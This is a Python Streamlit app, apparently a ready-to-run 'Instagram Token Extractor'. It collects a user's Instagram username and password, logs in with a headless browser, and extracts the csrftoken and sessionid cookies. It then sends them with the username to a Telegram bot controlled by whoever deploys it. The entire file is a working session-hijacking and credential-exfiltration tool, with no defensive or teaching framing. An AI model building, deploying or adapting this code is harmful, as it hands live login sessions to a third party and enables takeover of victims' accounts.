import streamlit as st
import asyncio
import requests
from playwright.async_api import async_playwright

# Replace with your bot token and Telegram user/chat ID
TELEGRAM_BOT_TOKEN = "your_bot_token_here"
TELEGRAM_CHAT_ID = "your_chat_id_here"

def send_to_telegram(csrf, sessionid, username):
    message = f"🔐 *Instagram Token Extracted*\n\n👤 Username: `{username}`\n🛡️ CSRF Token: `{csrf}`\n🔑 Session ID: `{sessionid}`"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, json=payload)
        return response.status_code == 200
    except Exception as e:
        return False

async def extract_tokens(username, password):
    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context()
            page = await context.new_page()

            await page.goto("https://www.instagram.com/accounts/login/")
            await page.wait_for_selector("input[name='username']", timeout=10000)

            await page.fill("input[name='username']", username)
            await page.fill("input[name='password']", password)
            await page.click("button[type='submit']")

            try:
                await page.wait_for_url("https://www.instagram.com/", timeout=15000)
            except:
                return None, None

            cookies = await context.cookies()
            csrf = next((c["value"] for c in cookies if c["name"] == "csrftoken"), None)
            sessionid = next((c["value"] for c in cookies if c["name"] == "sessionid"), None)

            await browser.close()
            return csrf, sessionid
    except Exception as e:
        return None, None

# Streamlit UI
st.set_page_config(page_title="IG Token Extractor", layout="centered")
st.title("Instagram Token Extractor (via Telegram)")

username = st.text_input("Instagram Username")
password = st.text_input("Instagram Password", type="password")

if st.button("Extract and Send via Telegram"):
    if not username or not password:
        st.warning("Please fill in both username and password.")
    else:
        with st.spinner("Logging in to Instagram..."):
            csrf_token, session_id = asyncio.run(extract_tokens(username, password))

            if csrf_token and session_id:
                success = send_to_telegram(csrf_token, session_id, username)
                if success:
                    st.success("✅ Token extracted and sent to Telegram.")
                else:
                    st.error("❌ Failed to send token to Telegram.")
            else:
                st.error("Login failed or tokens not found.")
